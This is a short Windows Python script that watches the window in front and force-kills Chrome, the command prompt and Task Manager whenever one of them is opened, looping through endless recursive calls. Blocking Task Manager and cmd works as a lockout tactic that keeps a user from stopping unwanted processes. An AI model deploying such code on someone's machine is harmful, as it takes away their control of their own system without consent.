from win32gui import GetWindowText, GetForegroundWindow
import os
import time
import ctypes  # An included library with Python install.

class varis:
	Act_Win = "no"


def main():
	varis.Act_Win = str(GetWindowText(GetForegroundWindow()))
	if 'Chrome' in varis.Act_Win:
		try:
			os.system("taskkill /IM chrome.exe /F")
			time.sleep(2)
			main();
		except:
			print ("chrome not founded")
			time.sleep(1.5)
			main();
	elif 'Command' in varis.Act_Win:
		try:
			os.system("taskkill /IM cmd.exe /F")
			time.sleep(2)
			main();
		except:
			print ("cmd not founded")
			time.sleep(1.5)
			main();
	elif 'Task' in varis.Act_Win:
		try:
			os.system("taskkill /IM Taskmgr.exe /F")
			time.sleep(2)
			main();
		except:
			print ("Task Manager not founded")
			time.sleep(1.5)
			main();
	else:
		time.sleep(.5)
		main();

main();
